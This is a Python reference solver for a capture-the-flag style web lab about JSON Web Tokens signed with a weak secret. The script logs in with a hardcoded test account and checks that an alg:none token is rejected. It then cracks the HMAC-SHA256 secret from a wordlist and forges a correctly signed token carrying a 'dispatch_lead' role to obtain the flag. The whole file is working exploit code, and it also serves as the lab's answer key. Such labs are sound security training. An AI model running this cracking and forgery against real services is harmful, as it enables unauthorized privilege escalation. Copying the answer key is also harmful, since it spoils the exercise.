#!/usr/bin/env python3
"""Masquerade Operation 05 reference solver -- Jackal tracks a weak signing key
back to a token nobody should have been able to forge.

WSTG-SESS-10: Testing JSON Web Tokens, weak/guessable secret variant. Unlike
Operation 04, there is no algorithm-confusion shortcut here: this verifier hard-codes
HS256 and genuinely, unconditionally recomputes and checks the signature every time.
The bug is what it's checking the signature AGAINST -- a short, guessable HMAC key.
Recover the key offline (a wordlist attack, exactly like a real jwt_tool/hashcat run
against a captured token) and you can sign ANY payload you want, correctly.

Usage: python3 solver.py [base_url] [wordlist_path]
       (defaults: http://localhost:8000, wordlists/op5_jwt_secrets.txt)
"""
import sys, os, base64, json, hmac, hashlib, requests, re

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
WORDLIST = sys.argv[2] if len(sys.argv) > 2 else os.path.join(
    os.path.dirname(__file__), "..", "..", "wordlists", "op5_jwt_secrets.txt")
USER = "field.agent"
PASSWORD = "Oregon2024!"
LEAD_ROLE = "dispatch_lead"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def sign(header_b64, payload_b64, secret):
    digest = hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
    return b64url_encode(digest)


def crack_secret(h_b64, p_b64, real_sig_b64, wordlist_path):
    with open(wordlist_path) as f:
        for line in f:
            candidate = line.strip()
            if candidate and hmac.compare_digest(sign(h_b64, p_b64, candidate), real_sig_b64):
                return candidate
    return None


def main():
    print(f"[*] Logging in as the provided test account ({USER}) to get a real token")
    r = requests.post(f"{BASE}/masquerade/op5/login", data={"username": USER, "password": PASSWORD})
    token = re.search(r'select-all">([^<]+)<', r.text).group(1).strip()
    h_b64, p_b64, sig_b64 = token.split(".")
    payload = json.loads(b64url_decode(p_b64))
    print(f"    decoded payload: {payload}")
    print(f"    (notice support_pin sitting right there in plain text -- secondary finding,")
    print(f"     doesn't help reach dispatch, but it's worth reporting on its own)")

    print(f"\n[*] Confirming a real, honestly-presented token is NOT dispatch_lead")
    r0 = requests.get(f"{BASE}/masquerade/op5/relay", headers={"Authorization": f"Bearer {token}"})
    print(f"    ledger says: {r0.json()}")

    print(f"\n[*] Confirming alg:none does NOT work here (this isn't Operation 04's bug)")
    none_header = b64url_encode(json.dumps({"typ": "JWT", "alg": "none"}).encode())
    r_none = requests.get(f"{BASE}/masquerade/op5/relay",
                           headers={"Authorization": f"Bearer {none_header}.{p_b64}."})
    print(f"    rejected: {'error' in r_none.json()} ({r_none.json()})")

    print(f"\n[*] Cracking the HMAC secret offline against {WORDLIST}")
    print(f"    (trying HMAC-SHA256(header.payload, candidate) for each line until one matches)")
    secret = crack_secret(h_b64, p_b64, sig_b64, WORDLIST)
    if not secret:
        print("[!] Did not crack the secret -- wordlist path wrong, or the app's secret changed.")
        return
    print(f"[+] Cracked secret: {secret!r}")

    print(f"\n[*] Forging a brand-new token, correctly signed with the cracked secret")
    forged_header = b64url_encode(json.dumps({"typ": "JWT", "alg": "HS256"}).encode())
    forged_payload = b64url_encode(json.dumps({"sub": "jackal", "role": LEAD_ROLE, "iat": 1}).encode())
    forged_token = f"{forged_header}.{forged_payload}.{sign(forged_header, forged_payload, secret)}"
    print(f"    forged token: {forged_token}")

    r2 = requests.get(f"{BASE}/masquerade/op5/relay", headers={"Authorization": f"Bearer {forged_token}"})
    data = r2.json()
    if data.get("flag"):
        print(f"[+] {data['flag']}")
    else:
        print(f"[!] forged token was not accepted: {data}")


if __name__ == "__main__":
    main()
